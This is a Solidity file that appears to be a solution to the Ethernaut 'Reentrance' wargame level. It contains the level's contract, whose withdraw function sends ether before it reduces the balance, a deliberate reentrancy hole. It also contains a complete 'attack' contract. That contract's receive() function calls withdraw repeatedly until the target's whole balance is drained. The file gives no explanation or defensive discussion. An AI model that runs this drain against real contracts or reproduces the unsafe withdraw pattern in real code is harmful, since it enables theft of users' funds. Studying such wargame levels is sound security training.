
pragma solidity >0.6.12;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract attack{

    Reentrance ct;
    address ataddr;
    uint public curbal;
    
    constructor(address payable _ct){

         ct=Reentrance(_ct);
         ataddr=_ct;
    }
    
    function donate() public payable {
        
        ct.donate{value:msg.value}(address(this));
    }

    function attackit(uint amt) public {
        ct.withdraw(amt);
    }

    receive() external payable{
          curbal=address(ct).balance;
           if(curbal>0)
           {  
                uint bal=address(ct).balance;
                ct.withdraw(bal);
           }
    }

}
